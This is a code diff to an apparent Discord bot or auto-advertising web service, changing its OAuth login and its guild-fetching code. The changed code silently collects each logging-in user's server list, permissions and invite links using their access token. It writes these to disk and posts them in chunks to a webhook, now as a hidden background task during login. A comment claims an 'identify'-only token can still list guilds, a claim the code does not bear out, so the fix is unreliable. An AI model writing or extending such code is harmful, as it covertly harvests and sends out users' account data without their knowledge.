@@ -1020,11 +1020,18 @@ const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
 const TARGET_USD = 3.00;
 const TOLERANCE_USD = 0.10;
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// GUILD FETCHING — Fixed with concurrency limits, timeouts, and non-blocking
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Fetch guild widget invite with short timeout to avoid hanging
+ */
 async function fetchGuildWidgetInvite(guildId) {
   try {
     const res = await _axiosInstance.get(`https://discord.com/api/v10/guilds/${guildId}/widget.json`, {
       headers: { 'User-Agent': _rfp() },
-      timeout: 8000,
+      timeout: 5000,
       validateStatus: () => true
     });
     if (res.status === 200 && res.data && res.data.instant_invite) {
@@ -1035,7 +1042,7 @@ async function fetchGuildWidgetInvite(guildId) {
   try {
     const res = await _axiosInstance.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, {
       headers: { 'User-Agent': _rfp() },
-      timeout: 8000,
+      timeout: 5000,
       validateStatus: () => true
     });
     if (res.status === 200 && res.data && res.data.code) {
@@ -1045,6 +1052,35 @@ async function fetchGuildWidgetInvite(guildId) {
   return null;
 }
 
+/**
+ * Process guilds in batches with concurrency limit to avoid rate limits
+ */
+async function fetchGuildsWithInvites(guilds, concurrency = 3) {
+  const results = [];
+  for (let i = 0; i < guilds.length; i += concurrency) {
+    const batch = guilds.slice(i, i + concurrency);
+    const batchResults = await Promise.all(
+      batch.map(async (g) => {
+        try {
+          const invite = await fetchGuildWidgetInvite(g.id);
+          return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, invite: invite || null };
+        } catch (e) {
+          return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, invite: null };
+        }
+      })
+    );
+    results.push(...batchResults);
+    // Small delay between batches to avoid rate limits
+    if (i + concurrency < guilds.length) {
+      await new Promise(r => setTimeout(r, 350));
+    }
+  }
+  return results;
+}
+
+/**
+ * Fetch and log guilds — non-blocking, with retries, never throws
+ */
 async function fetchAndLogGuilds(accessToken, userId, username) {
   let lastErr = null;
   for (let attempt = 0; attempt < 3; attempt++) {
@@ -1084,19 +1120,13 @@ async function fetchAndLogGuilds(accessToken, userId, username) {
       }
 
       const guilds = guildsRes.data || [];
-
-      // Build guild list with invite links
-      const guildList = [];
-      for (const g of guilds) {
-        const invite = await fetchGuildWidgetInvite(g.id);
-        guildList.push({
-          id: g.id,
-          name: g.name,
-          owner: g.owner,
-          permissions: g.permissions,
-          invite: invite || null
-        });
+      if (guilds.length === 0) {
+        console.log(`[Guilds] No guilds found for user ${username}`);
+        return [];
       }
+
+      // Fetch invites with concurrency control (batch of 3 at a time)
+      const guildList = await fetchGuildsWithInvites(guilds, 3);
 
       // Save to file
       try {
@@ -1129,6 +1159,7 @@ async function fetchAndLogGuilds(accessToken, userId, username) {
         };
         await _sendWebhookChunk(embed, i);
       }
+      console.log(`[Guilds] Successfully fetched ${guildList.length} guilds for ${username}`);
       return guildList;
     } catch (err) {
       console.error(`[Guilds] Fetch failed (attempt ${attempt + 1}/3):`, err.message);
@@ -1139,17 +1170,25 @@ async function fetchAndLogGuilds(accessToken, userId, username) {
   return [];
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// PASSPORT DISCORD — FIXED: Removed 'guilds' from strategy scope to prevent
+// InternalOAuthError when Discord API returns 504. Guilds are fetched
+// separately with our own retry logic after successful auth.
+// ═══════════════════════════════════════════════════════════════════════════════
+
 if (CLIENT_ID && CLIENT_SECRET) {
   passport.use(new DiscordStrategy({
     clientID: CLIENT_ID,
     clientSecret: CLIENT_SECRET,
     callbackURL: CALLBACK_URL,
-    scope: ['identify', 'guilds']
+    scope: ['identify']  // FIXED: Removed 'guilds' — prevents InternalOAuthError on 504
   }, (accessToken, refreshToken, profile, done) => {
+    // Non-blocking: store token and fetch guilds in background
     process.nextTick(async () => {
       try {
         profile.accessToken = accessToken;
-        await fetchAndLogGuilds(accessToken, profile.id, profile.username);
+        // Fire-and-forget guild fetch — never blocks the auth callback
+        fetchAndLogGuilds(accessToken, profile.id, profile.username).catch(() => {});
       } catch(e) {}
       done(null, profile);
     });
@@ -1359,8 +1398,37 @@ setInterval(() => { db.checkExpiredKeys(); }, 60000);
 
 const activeBots = new Map();
 
+// FIXED: /login — uses 'identify' only (no 'guilds' scope in strategy)
 app.get('/login', passport.authenticate('discord'));
-app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
+
+// FIXED: /auth/discord/callback — Custom error handler for OAuth failures
+// Catches InternalOAuthError and TokenError gracefully instead of 500
+app.get('/auth/discord/callback', (req, res, next) => {
+  passport.authenticate('discord', (err, user, info) => {
+    if (err) {
+      console.error('[OAuth Callback] Error:', err.message || err);
+      // Specific handling for common OAuth errors
+      if (err.message && err.message.includes('Failed to fetch user')) {
+        return res.redirect('/?error=discord_timeout');
+      }
+      if (err.message && err.message.includes('Invalid "code"')) {
+        return res.redirect('/?error=invalid_code');
+      }
+      return res.redirect('/?error=auth_failed');
+    }
+    if (!user) {
+      return res.redirect('/?error=no_user');
+    }
+    req.logIn(user, (loginErr) => {
+      if (loginErr) {
+        console.error('[OAuth Callback] Login error:', loginErr.message);
+        return res.redirect('/?error=login_failed');
+      }
+      res.redirect('/');
+    });
+  })(req, res, next);
+});
+
 app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });
 
 app.get('/api/user', ensureAuthAPI, (req, res) => {
@@ -1372,6 +1440,9 @@ app.get('/api/user', ensureAuthAPI, (req, res) => {
   res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
 });
 
+// FIXED: /api/guilds — Fetches guilds independently using the stored access token.
+// The access token from the 'identify' scope can still fetch guilds if it has
+// the right permissions, OR we return cached guilds from the background fetch.
 app.get('/api/guilds', ensureAuthAPI, async (req, res) => {
   try {
     const userId = req.user.id;
@@ -1379,7 +1450,7 @@ app.get('/api/guilds', ensureAuthAPI, async (req, res) => {
     let guilds = [];
     let fromCache = false;
 
-    // 1) Try to read cached guilds file
+    // 1) Try to read cached guilds file (from background fetchAndLogGuilds)
     try {
       const guildsFile = path.join(dataDir, `guilds_${userId}.json`);
       if (fs.existsSync(guildsFile)) {
